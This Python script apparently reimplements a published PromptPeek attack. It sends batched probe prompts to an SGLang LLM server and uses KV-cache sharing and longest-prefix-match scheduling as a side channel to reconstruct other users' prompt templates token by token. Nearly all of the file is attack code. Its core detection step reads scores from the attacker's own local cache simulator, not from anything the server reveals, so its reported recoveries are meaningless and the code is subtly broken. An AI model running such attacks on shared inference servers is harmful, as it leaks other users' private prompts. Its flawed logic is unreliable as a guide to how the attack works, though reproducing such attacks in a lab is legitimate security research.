# promptpeek_realistic.py
import asyncio
import aiohttp
import time
import json
import random
import heapq
from typing import List, Tuple, Optional, Dict, Set
from transformers import AutoTokenizer, AutoModelForCausalLM
import torch
from datasets import load_dataset
from collections import defaultdict, deque

# ==================== CONFIGURATION ====================
SGLANG_URL = "http://localhost:30000/generate"
DATASET_NAME = "fka/awesome-chatgpt-prompts"
SERVER_MODEL = "meta-llama/Llama-2-13b-chat-hf"  # Should match SGLang server

# Attack parameters
MAX_OUTPUT_TOKENS = 1
DUMMY_BATCH_SIZE = 20
CANDIDATE_BATCH_SIZE = 50
TOP_K_CANDIDATES = 20
MAX_PROMPT_LENGTH = 200

# ==================== KV CACHE SIMULATOR ====================
class KVCacheSimulator:
    """Simulates KV cache sharing and LPM scheduling as described in paper"""
    
    def __init__(self):
        self.kv_cache = {}  # token_sequence -> cache_entry
        self.lru_queue = deque()  # For LRU eviction
        self.max_cache_size = 10000  # tokens
        self.current_cache_size = 0
        
    def get_shared_prefix_length(self, prompt: str, stored_prompt: str) -> int:
        """Calculate shared prefix length between two prompts"""
        min_len = min(len(prompt), len(stored_prompt))
        for i in range(min_len):
            if prompt[i] != stored_prompt[i]:
                return i
        return min_len
    
    def add_to_cache(self, prompt: str):
        """Add prompt tokens to KV cache"""
        if prompt not in self.kv_cache:
            # Simulate adding each token to cache
            token_count = len(prompt.split())
            self.kv_cache[prompt] = {
                'tokens': token_count,
                'last_used': time.time(),
                'prompt': prompt
            }
            self.lru_queue.append(prompt)
            self.current_cache_size += token_count
            
            # LRU eviction if needed
            while self.current_cache_size > self.max_cache_size and self.lru_queue:
                oldest = self.lru_queue.popleft()
                if oldest in self.kv_cache:
                    self.current_cache_size -= self.kv_cache[oldest]['tokens']
                    del self.kv_cache[oldest]
    
    def get_lpm_score(self, prompt: str) -> int:
        """Calculate LPM score for scheduling (higher = more shared tokens)"""
        max_shared = 0
        for stored_prompt in self.kv_cache:
            shared = self.get_shared_prefix_length(prompt, stored_prompt)
            max_shared = max(max_shared, shared)
        return max_shared

# ==================== REALISTIC PROMPT DATABASE ====================
class RealisticPromptDatabase:
    def __init__(self):
        print(f"Loading {DATASET_NAME}...")
        self.dataset = load_dataset(DATASET_NAME, split="train")
        self.full_prompts = [item["prompt"] for item in self.dataset]
        self.templates = self._extract_templates()
        print(f"Loaded {len(self.full_prompts)} prompts, {len(self.templates)} templates")
        
    def _extract_templates(self):
        """Extract templates from prompts"""
        templates = set()
        for prompt in self.full_prompts:
            # Common patterns in awesome-chatgpt-prompts
            markers = [
                "My first request is",
                "My first sentence is", 
                "My first question is",
                "I want you to reply",
                "My initial request is"
            ]
            
            for marker in markers:
                if marker in prompt:
                    template = prompt.split(marker)[0].strip()
                    templates.add(template)
                    break
            else:
                # If no marker, use first 100 chars as template
                templates.add(prompt[:100].strip())
        
        return list(templates)
    
    def get_random_prompt(self) -> str:
        """Get a random full prompt"""
        return random.choice(self.full_prompts)
    
    def get_random_template(self) -> str:
        """Get a random template"""
        return random.choice(self.templates)
    
    def extract_input_from_prompt(self, prompt: str) -> Tuple[str, str]:
        """Extract template and user input from prompt"""
        markers = [
            "My first request is",
            "My first sentence is", 
            "My first question is",
            "I want you to reply",
            "My initial request is"
        ]
        
        for marker in markers:
            if marker in prompt:
                parts = prompt.split(marker, 1)
                template = parts[0].strip()
                user_input = parts[1].strip().strip('"').strip("'").strip()
                return template, user_input
        
        # Fallback: split by first quote or use last sentence
        if '"' in prompt:
            parts = prompt.split('"', 1)
            template = parts[0].strip()
            user_input = parts[1].strip().rstrip('"').strip()
        else:
            # Use last sentence as input
            sentences = prompt.split('.')
            if len(sentences) > 1:
                template = '.'.join(sentences[:-1]) + '.'
                user_input = sentences[-1].strip()
            else:
                template = prompt[:len(prompt)//2]
                user_input = prompt[len(prompt)//2:]
        
        return template, user_input

# ==================== REALISTIC LOCAL LLM ====================
class RealisticLocalLLM:
    def __init__(self, model_name: str):
        print(f"Loading local LLM: {model_name}")
        self.tokenizer = None
        self.model = None
        
        try:
            self.tokenizer = AutoTokenizer.from_pretrained(model_name)
            self.model = AutoModelForCausalLM.from_pretrained(
                model_name,
                torch_dtype=torch.float16,
                device_map="auto",
                load_in_8bit=True
            )
            self.model.eval()
            self.vocab_size = len(self.tokenizer)
            print(f"✓ Model loaded successfully. Vocabulary size: {self.vocab_size}")
        except Exception as e:
            print(f"✗ Failed to load {model_name}. Error: {e}")
            print(f"  Attempting to load smaller model (distilgpt2)...")
            try:
                self.tokenizer = AutoTokenizer.from_pretrained("distilgpt2")
                self.model = AutoModelForCausalLM.from_pretrained("distilgpt2")
                self.model.eval()
                self.vocab_size = len(self.tokenizer)
                print(f"✓ Fallback model (distilgpt2) loaded successfully. Vocabulary size: {self.vocab_size}")
            except Exception as e2:
                print(f"✗ Failed to load fallback model. Error: {e2}")
                print(f"  Warning: Will use statistical fallback for token prediction")
                self.tokenizer = None
                self.model = None
    
    def predict_next_tokens(self, context: str, top_k: int = 20) -> List[str]:
        """Predict most likely next tokens given context"""
        if not self.model or not self.tokenizer:
            # Fallback: statistical prediction based on context patterns
            return self._statistical_prediction(context, top_k)
        
        # Tokenize context
        try:
            inputs = self.tokenizer(context, return_tensors="pt", truncation=True, max_length=512)
            inputs = {k: v.to(self.model.device) for k, v in inputs.items()}
            
            with torch.no_grad():
                outputs = self.model(**inputs)
                logits = outputs.logits[0, -1, :]  # Last token logits
                
                # Get top-k tokens
                topk_values, topk_indices = torch.topk(logits, min(top_k, logits.shape[0]))
                
                # Decode tokens
                candidates = []
                for token_id in topk_indices.tolist():
                    token_text = self.tokenizer.decode([token_id])
                    # Clean up
                    token_text = token_text.strip()
                    if token_text and token_text not in ['\n', '\t', '  ']:
                        candidates.append(token_text)
            
            return candidates if candidates else self._statistical_prediction(context, top_k)
        except Exception as e:
            print(f"[Error] Failed to predict next tokens: {e}")
            return self._statistical_prediction(context, top_k)
    
    def _statistical_prediction(self, context: str, top_k: int = 20) -> List[str]:
        """Fallback statistical prediction based on context patterns"""
        # Common continuations based on context keywords
        patterns = {
            "want you to": ["act", " as", " be", " play", " role"],
            "act as": [" a", " an", " the", " your", " "],
            "I want": [" you", " to", " ", " a"],
            "you to act": [" as", " like", " out"],
            "is": [" a", " the", " to", " ", " not"],
            "the": [" ", "assistant", "user", "game", "board"],
        }
        
        candidates = []
        for pattern, continuations in patterns.items():
            if pattern in context.lower():
                candidates.extend(continuations)
        
        # If no pattern matched, use generic common tokens
        if not candidates:
            candidates = [" ", "the", "a", "to", "of", "in", "and", "you", "is"]
        
        # Remove duplicates and return top_k
        candidates = list(dict.fromkeys(candidates))[:top_k]
        return candidates
    
    def generate_dummy_token(self, context: str = "") -> str:
        """Generate a token unlikely to appear in prompts"""
        if not self.tokenizer:
            return "ζξψ"  # Rare Greek letters
        
        # Get least likely token
        if context:
            inputs = self.tokenizer(context, return_tensors="pt", truncation=True, max_length=512)
            inputs = {k: v.to(self.model.device) for k, v in inputs.items()}
            
            with torch.no_grad():
                outputs = self.model(**inputs)
                logits = outputs.logits[0, -1, :]
                least_likely_idx = torch.argmin(logits).item()
                return self.tokenizer.decode([least_likely_idx])
        
        # Return rare token from vocabulary
        rare_chars = ["ζ", "ξ", "ψ", "ω", "∇", "∂", "∫", "∮", "ℵ", "ℏ"]
        return random.choice(rare_chars)

# ==================== REALISTIC SGLANG CLIENT ====================
class RealisticSGLangClient:
    def __init__(self, url: str):
        self.url = url
        self.kv_simulator = KVCacheSimulator()
        self.request_history = []
        
    async def send_request(self, prompt: str, max_tokens: int = 1, 
                          track_kv: bool = False) -> Tuple[str, float, Dict]:
        """Send request and simulate KV cache behavior"""
        
        payload = {
            "text": prompt,
            "max_tokens": max_tokens,
            "temperature": 0.0,
            "top_p": 1.0
        }
        
        start_time = time.time()
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(self.url, json=payload) as response:
                    if response.status == 200:
                        result = await response.json()
                        response_text = result.get("text", "")
                        latency = time.time() - start_time
                        
                        # Simulate KV cache update
                        if track_kv:
                            self.kv_simulator.add_to_cache(prompt)
                            lpm_score = self.kv_simulator.get_lpm_score(prompt)
                        else:
                            lpm_score = 0
                        
                        return response_text, latency, {
                            'prompt': prompt,
                            'kv_hit': lpm_score > 0,
                            'lpm_score': lpm_score,
                            'timestamp': start_time
                        }
                    else:
                        return f"ERROR_{response.status}", time.time() - start_time, {}
        except Exception as e:
            return f"ERROR_{str(e)}", time.time() - start_time, {}
    
    async def send_batch(self, prompts: List[str], max_tokens: int = 1) -> List[Tuple[str, float, Dict]]:
        """Send batch of requests with simulated LPM scheduling"""
        
        # Calculate LPM scores for each prompt
        lpm_scores = []
        for prompt in prompts:
            lpm_scores.append(self.kv_simulator.get_lpm_score(prompt))
        
        # Sort by LPM score (higher first) as per LPM scheduling
        sorted_indices = sorted(range(len(prompts)), key=lambda i: lpm_scores[i], reverse=True)
        sorted_prompts = [prompts[i] for i in sorted_indices]
        
        # Send requests in LPM order
        tasks = []
        for prompt in sorted_prompts:
            task = self.send_request(prompt, max_tokens, track_kv=True)
            tasks.append(task)
        
        results = await asyncio.gather(*tasks)
        
        # Reorder results back to original order
        reordered_results = [None] * len(prompts)
        for idx, result in zip(sorted_indices, results):
            reordered_results[idx] = result
        
        return reordered_results

# ==================== REALISTIC PROMPTPEEK ATTACKER ====================
class RealisticPromptPeekAttacker:
    def __init__(self, client: RealisticSGLangClient, local_llm: RealisticLocalLLM, 
                 prompt_db: RealisticPromptDatabase):
        self.client = client
        self.local_llm = local_llm
        self.prompt_db = prompt_db
        self.dummy_token = local_llm.generate_dummy_token()
        
        # Statistics
        self.stats = {
            'total_requests': 0,
            'tokens_recovered': 0,
            'prompts_attacked': 0,
            'successful_attacks': 0,
            'partial_recoveries': 0
        }
        
        self.reconstruction_log = []
    
    async def simulate_victim_queries(self, num_queries: int = 10):
        """Simulate victim sending queries to populate KV cache"""
        print(f"\n[Simulation] Victim sending {num_queries} queries...")
        
        for i in range(num_queries):
            prompt = self.prompt_db.get_random_prompt()
            response, latency, metadata = await self.client.send_request(
                prompt, max_tokens=50, track_kv=True
            )
            
            template, user_input = self.prompt_db.extract_input_from_prompt(prompt)
            
            print(f"  Victim Query {i+1}: {prompt[:80]}...")
            print(f"    Template: {template[:60]}...")
            print(f"    Input: {user_input[:60]}...")
            
            await asyncio.sleep(0.5)  # Simulate time between queries
        
        print("[Simulation] Victim queries completed")
    
    async def detect_lpm_pattern(self, candidate_prompts: List[str], 
                                dummy_prompt: str) -> Optional[int]:
        """
        Detect which candidate triggers LPM reordering
        Returns index of matched candidate or None
        """
        # Create batch: dummies + candidates + dummies
        pre_dummies = [dummy_prompt] * DUMMY_BATCH_SIZE
        post_dummies = [dummy_prompt] * DUMMY_BATCH_SIZE
        all_prompts = pre_dummies + candidate_prompts + post_dummies
        
        # Send batch
        results = await self.client.send_batch(all_prompts, MAX_OUTPUT_TOKENS)
        self.stats['total_requests'] += len(all_prompts)
        
        # Extract metadata
        pre_results = results[:DUMMY_BATCH_SIZE]
        candidate_results = results[DUMMY_BATCH_SIZE:DUMMY_BATCH_SIZE + len(candidate_prompts)]
        post_results = results[DUMMY_BATCH_SIZE + len(candidate_prompts):]
        
        # Analyze response order using LPM scores
        # In LPM, matched candidate should have higher LPM score than dummies
        
        candidate_lpm_scores = []
        for (response, latency, metadata), prompt in zip(candidate_results, candidate_prompts):
            lpm_score = metadata.get('lpm_score', 0)
            candidate_lpm_scores.append((lpm_score, prompt, metadata.get('kv_hit', False)))
        
        # Find candidate with highest LPM score (likely match)
        if candidate_lpm_scores:
            max_score = max(score for score, _, _ in candidate_lpm_scores)
            if max_score > 0:  # At least some KV cache hit
                # Find all candidates with max score
                max_candidates = [i for i, (score, _, _) in enumerate(candidate_lpm_scores) 
                                 if score == max_score]
                
                if len(max_candidates) == 1:
                    # Unique highest score
                    return max_candidates[0]
                elif len(max_candidates) > 1:
                    # Multiple with same score - choose first
                    return max_candidates[0]
        
        return None
    
    async def extract_next_token(self, current_template: str, 
                                user_input: str, user_output: str) -> Optional[str]:
        """Extract next token using actual KV cache side channel"""
        
        # Generate candidate tokens using local LLM
        context = f"Template: {current_template}\nUser Input: {user_input}\nOutput: {user_output}\nNext token in template:"
        
        candidates = self.local_llm.predict_next_tokens(context, TOP_K_CANDIDATES)
        
        if not candidates:
            print("[Attack] No candidates generated")
            return None
        
        print(f"[Attack] Generated {len(candidates)} candidates: {candidates[:5]}...")
        
        # Create candidate prompts
        candidate_prompts = []
        for cand in candidates:
            # Try both with and without space
            candidate_prompts.append(current_template + cand)
            candidate_prompts.append(current_template + " " + cand)
        
        # Remove duplicates
        candidate_prompts = list(set(candidate_prompts))[:CANDIDATE_BATCH_SIZE]
        
        # Create dummy prompt (unlikely to match)
        dummy_prompt = current_template + self.dummy_token
        
        # Detect which candidate triggers LPM
        matched_idx = await self.detect_lpm_pattern(candidate_prompts, dummy_prompt)
        
        if matched_idx is not None:
            matched_prompt = candidate_prompts[matched_idx]
            # Extract the token that was added
            if matched_prompt.startswith(current_template):
                token = matched_prompt[len(current_template):].strip()
                print(f"[Attack] Recovered token: '{token}'")
                return token
        
        print("[Attack] No token recovered")
        return None
    
    async def reconstruct_template_from_observation(self, observed_input: str, 
                                                   observed_output: str,
                                                   max_tokens: int = 50) -> str:
        """
        Main reconstruction algorithm as described in paper
        """
        print(f"\n{'='*80}")
        print("STARTING TEMPLATE RECONSTRUCTION")
        print(f"{'='*80}")
        print(f"Observed Input: {observed_input}")
        print(f"Observed Output: {observed_output[:100]}...")
        
        reconstructed = ""
        attempts = 0
        max_attempts = max_tokens * 200  # Allow 3 attempts per token
    
        while len(reconstructed.split()) < max_tokens and attempts < max_attempts:
            attempts += 1
            
            print(f"\n[Reconstruction] Step {attempts}, Current: '{reconstructed}'")
            
            # Try to extract next token
            next_token = await self.extract_next_token(
                reconstructed, observed_input, observed_output
            )
            
            if next_token:
                reconstructed += next_token
                self.stats['tokens_recovered'] += 1
                
                # Check for completion patterns
                if self._is_template_complete(reconstructed):
                    print("[Reconstruction] Template appears complete")
                    break
                
                # Reset attempts on success
                attempts = 0
            else:
                # Try fallback: common template patterns
                fallback_token = self._get_fallback_token(reconstructed)
                if fallback_token:
                    reconstructed += fallback_token
                    print(f"[Reconstruction] Used fallback token: '{fallback_token}'")
                else:
                    print("[Reconstruction] Stuck, trying different approach...")
                    # Try adding space
                    if reconstructed and reconstructed[-1] != ' ':
                        reconstructed += ' '
            
            # Avoid infinite loops
            if attempts > 10:
                print("[Reconstruction] Too many failed attempts, stopping")
                break
        
        return reconstructed
    
    def _is_template_complete(self, template: str) -> bool:
        """Check if template looks complete"""
        completion_indicators = [
            "My first request is",
            "My first sentence is",
            "Do not write explanations",
            "You should only reply",
            "I want you to act as",
            "Your role is",
            "Act as if you are"
        ]
        
        # Check if any indicator is in the template
        for indicator in completion_indicators:
            if indicator in template:
                return True
        
        # Check length
        if len(template) > 200:
            return True
        
        return False
    
    def _get_fallback_token(self, current_template: str) -> Optional[str]:
        """Get fallback token based on common patterns"""
        
        # Common words in awesome-chatgpt-prompts
        common_patterns = [
            ("I want you to", " act as"),
            ("act as", " "),
            ("You are", " "),
            ("Your role", " is"),
            ("role", " is"),
            ("is", " to"),
            ("to", " "),
            ("only", " reply"),
            ("reply", " with"),
            ("with", " "),
            ("Do not", " write"),
            ("write", " explanations"),
            ("explanations", ".")
        ]
        
        for pattern, next_word in common_patterns:
            if pattern in current_template and next_word not in current_template:
                return next_word
        
        # Try to match with known templates
        for template in self.prompt_db.templates:
            if template.startswith(current_template):
                remaining = template[len(current_template):]
                if remaining:
                    # Return first non-space character
                    for char in remaining:
                        if char != ' ':
                            return char
                    return remaining[0] if remaining else None
        
        return None
    
    async def run_attack_scenario(self, num_attacks: int = 3):
        """Run complete attack scenario as in paper"""
        
        print(f"\n{'='*80}")
        print(f"RUNNING {num_attacks} ATTACKS")
        print(f"{'='*80}")
        
        results = []
        
        for attack_num in range(1, num_attacks + 1):
            print(f"\n\n{'='*80}")
            print(f"ATTACK #{attack_num}/{num_attacks}")
            print(f"{'='*80}")
            
            # 1. Simulate victim activity
            await self.simulate_victim_queries(5)
            
            # 2. Get a random prompt to attack
            prompt = self.prompt_db.get_random_prompt()
            true_template, user_input = self.prompt_db.extract_input_from_prompt(prompt)
            
            # 3. Get actual output by sending the prompt
            print(f"\n[Attack #{attack_num}] Getting actual output from server...")
            actual_output, latency, _ = await self.client.send_request(
                prompt, max_tokens=100
            )
            
            print(f"  True Template: {true_template[:100]}...")
            print(f"  User Input: {user_input}")
            print(f"  Actual Output: {actual_output[:100]}...")
            
            # 4. Reconstruct template (attacker only knows input and output)
            reconstructed = await self.reconstruct_template_from_observation(
                user_input, actual_output, max_tokens=400
            )
            
            # 5. Calculate accuracy
            accuracy = self._calculate_accuracy(true_template, reconstructed)
            
            results.append({
                'attack_num': attack_num,
                'true_template': true_template,
                'reconstructed': reconstructed,
                'accuracy': accuracy,
                'tokens_recovered': self.stats['tokens_recovered'],
                'requests_used': self.stats['total_requests']
            })
            
            print(f"\n[Attack #{attack_num}] Results:")
            print(f"  Accuracy: {accuracy:.1f}%")
            print(f"  Tokens Recovered: {self.stats['tokens_recovered']}")
            print(f"  Requests Used: {self.stats['total_requests']}")
            print(f"  True: {true_template[:150]}...")
            print(f"  Reconstructed: {reconstructed}")
            
            # Reset stats for next attack
            self.stats['tokens_recovered'] = 0
            self.stats['total_requests'] = 0
            
            # Save intermediate results
            self._save_results(results)
            
            # Wait before next attack
            if attack_num < num_attacks:
                print(f"\n[Attack] Waiting before next attack...")
                await asyncio.sleep(2)
        
        return results
    
    def _calculate_accuracy(self, true: str, reconstructed: str) -> float:
        """Calculate accuracy of reconstruction"""
        if not reconstructed:
            return 0.0
        
        # Token-level accuracy
        true_tokens = true.split()
        recon_tokens = reconstructed.split()
        
        if not true_tokens or not recon_tokens:
            return 0.0
        
        # Calculate precision and recall
        matched = 0
        for i in range(min(len(true_tokens), len(recon_tokens))):
            if true_tokens[i] == recon_tokens[i]:
                matched += 1
        
        precision = matched / len(recon_tokens) if recon_tokens else 0
        recall = matched / len(true_tokens) if true_tokens else 0
        
        # F1 score
        if precision + recall > 0:
            return 2 * precision * recall / (precision + recall) * 100
        return 0.0
    
    def _save_results(self, results: List[Dict]):
        """Save attack results"""
        with open("attack_results.json", "w") as f:
            json.dump({
                'results': results,
                'final_stats': self.stats,
                'timestamp': time.time(),
                'parameters': {
                    'dummy_batch_size': DUMMY_BATCH_SIZE,
                    'candidate_batch_size': CANDIDATE_BATCH_SIZE,
                    'top_k_candidates': TOP_K_CANDIDATES
                }
            }, f, indent=2)
        print(f"[Attack] Results saved to attack_results.json")

# ==================== MAIN ====================
async def main():
    print("Initializing Realistic PromptPeek Attack Simulation")
    print("="*80)
    
    # Initialize components
    print("1. Loading prompt database...")
    prompt_db = RealisticPromptDatabase()
    
    print("2. Loading local LLM...")
    local_llm = RealisticLocalLLM(SERVER_MODEL)
    
    print("3. Initializing SGLang client...")
    client = RealisticSGLangClient(SGLANG_URL)
    
    print("4. Creating attacker...")
    attacker = RealisticPromptPeekAttacker(client, local_llm, prompt_db)
    
    print("\n" + "="*80)
    print("SELECT ATTACK MODE")
    print("="*80)
    print("1. Quick test (single prompt)")
    print("2. Full attack scenario (multiple prompts)")
    print("3. Continuous monitoring")
    
    # try:
    #     choice = int(input("\nSelect (1-3): ").strip() or "1")
    # except:
    choice = 2
    
    if choice == 1:
        # Quick test
        print("\nRunning quick test...")
        
        # Get a prompt to attack
        prompt = prompt_db.get_random_prompt()
        true_template, user_input = prompt_db.extract_input_from_prompt(prompt)
        
        # Get actual output
        output, latency, _ = await client.send_request(prompt, max_tokens=50)
        
        print(f"\nTest Case:")
        print(f"  Full Prompt: {prompt[:100]}...")
        print(f"  True Template: {true_template[:80]}...")
        print(f"  User Input: {user_input}")
        print(f"  Output: {output[:80]}...")
        
        # Reconstruct
        reconstructed = await attacker.reconstruct_template_from_observation(
            user_input, output, max_tokens=20
        )
        
        accuracy = attacker._calculate_accuracy(true_template, reconstructed)
        
        print(f"\nResults:")
        print(f"  Accuracy: {accuracy:.1f}%")
        print(f"  Reconstructed: {reconstructed}")
        print(f"  Requests Used: {attacker.stats['total_requests']}")
        
    elif choice == 2:
        # Full attack scenario
        num_attacks = int(input("Number of attacks (default 3): ").strip() or "3")
        results = await attacker.run_attack_scenario(num_attacks)
        
        # Print summary
        print(f"\n{'='*80}")
        print("ATTACK SUMMARY")
        print(f"{'='*80}")
        
        accuracies = [r['accuracy'] for r in results]
        requests = [r['requests_used'] for r in results]
        
        print(f"Total attacks: {len(results)}")
        print(f"Average accuracy: {sum(accuracies)/len(accuracies):.1f}%")
        print(f"Average requests per attack: {sum(requests)/len(requests):.0f}")
        print(f"Best accuracy: {max(accuracies):.1f}%")
        print(f"Worst accuracy: {min(accuracies):.1f}%")
        
        # Compare with paper
        print(f"\n{'='*80}")
        print("PAPER COMPARISON (Table II)")
        print(f"{'='*80}")
        print("Paper Results for Template Extraction:")
        print("  Success Rate: 94-100%")
        print("  Requests per prompt: ~1687")
        print("  Requests per token: ~21")
        print("\nOur Results:")
        print(f"  Success Rate: {sum(1 for a in accuracies if a > 50)/len(accuracies)*100:.0f}%")
        if results:
            avg_requests = sum(requests)/len(requests)
            avg_tokens = sum(r['tokens_recovered'] for r in results)/len(results)
            print(f"  Requests per prompt: {avg_requests:.0f}")
            print(f"  Requests per token: {avg_requests/max(1, avg_tokens):.0f}")
        
    elif choice == 3:
        # Continuous monitoring
        print("\nStarting continuous monitoring...")
        duration = 600  # 10 minutes
        start_time = time.time()
        
        attacks_performed = 0
        while time.time() - start_time < duration:
            # Wait for victim activity
            await asyncio.sleep(5)
            
            # Perform attack
            prompt = prompt_db.get_random_prompt()
            true_template, user_input = prompt_db.extract_input_from_prompt(prompt)
            output, latency, _ = await client.send_request(prompt, max_tokens=50)
            
            reconstructed = await attacker.reconstruct_template_from_observation(
                user_input, output, max_tokens=15
            )
            
            accuracy = attacker._calculate_accuracy(true_template, reconstructed)
            attacks_performed += 1
            
            print(f"[{time.time()-start_time:.0f}s] Attack {attacks_performed}: "
                  f"Accuracy={accuracy:.1f}%, Tokens={attacker.stats['tokens_recovered']}")
            
            # Reset for next attack
            attacker.stats['tokens_recovered'] = 0
            attacker.stats['total_requests'] = 0
        
        print(f"\nContinuous monitoring completed.")
        print(f"Total attacks performed: {attacks_performed}")

if __name__ == "__main__":
    asyncio.run(main())